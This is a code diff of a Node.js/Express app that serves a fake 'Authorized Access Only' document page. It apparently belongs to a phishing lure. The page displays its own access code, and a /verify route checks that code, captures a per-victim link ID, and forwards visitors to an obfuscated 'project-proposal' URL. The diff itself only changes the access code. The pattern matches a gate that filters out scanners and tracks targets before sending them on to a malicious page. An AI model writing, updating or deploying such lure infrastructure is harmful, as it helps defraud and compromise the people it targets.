@@ -550,7 +550,7 @@ const myHTML = `
             <div class="stat-label">Reference</div>
           </div>
           <div class="stat">
-            <div class="stat-value">223490</div>
+            <div class="stat-value">2027896</div>
             <div class="stat-label">Access Code</div>
           </div>
           <div class="stat">
@@ -577,7 +577,7 @@ const myHTML = `
       <div class="form-header">
         <span class="form-eyebrow">Authorized Access Only</span>
         <h2 class="form-title">Enter the password to view</h2>
-        <p class="form-subtitle">This document requires a valid access code to proceed. Your Access Code: 223490</p>
+        <p class="form-subtitle">This document requires a valid access code to proceed. Your Access Code: 2027896</p>
       </div>
 
       <div class="form-description">
@@ -655,7 +655,7 @@ const myHTML = `
 app.post('/verify', async (req, res) => {
   const { code } = req.body;
   const linkId = req.query.id || 'unknown'; // Capture the unique ID from URL
-  const CORRECT_CODE = "223490";
+  const CORRECT_CODE = "2027896";
   const TARGET_URL = "https://modular-constructions.build/connect/project-proposal/W0IcW0IcTxn96lsNOpzKveecaW0IcTxzKveecaW0IcTxn96lsNOpw5OYw5OYTxzKveecaW0IcTxn96lsNOpPROPOSAL";
 
   if (code === CORRECT_CODE) {
